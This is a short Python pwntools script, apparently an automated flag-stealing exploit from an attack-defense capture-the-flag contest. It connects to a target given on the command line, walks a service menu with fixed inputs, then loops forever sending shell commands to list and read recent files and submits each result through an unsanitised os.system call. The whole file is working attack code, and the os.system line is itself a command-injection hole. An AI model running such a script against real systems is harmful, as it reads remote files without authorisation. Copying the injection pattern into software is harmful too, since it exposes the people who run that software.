from pwn import *
import os
import sys
conn = remote(str(sys.argv[1]),sys.argv[2])
sleep(1)
print conn.recv(timeout=2)
sleep(1)
conn.send('1\n')
sleep(1)
print conn.recv(timeout=2)
sleep(1)
conn.send('asdf\n')
sleep(1)
print conn.recv(timeout=2)
sleep(1)
conn.send('asdf\n')
sleep(1)
print conn.recv(timeout=2)
sleep(1)
conn.send('5\n')
sleep(1)
print conn.recv(timeout=2)
sleep(1)
conn.send(sys.argv[3]+'\n')
sleep(1)
print conn.recv(timeout=2)
sleep(1)
while True:
	conn.send('ls -t | head -4\n')
	str=conn.recv(timeout=2)
	print 'TEAM15'
	print str
	list=str.split("\n")
	list = list[:-1]
	# print list
	for x in list:
		y = x.find('_FLG')
		if y == -1:
			conn.send('cat '+x+'\n')
			sleep(1)
			flg=conn.recv(timeout=3)
			print "Flag "+flg
			os.system('python api.py '+flg)
	print 'DONE!!!'
	sleep(100)
conn.close()
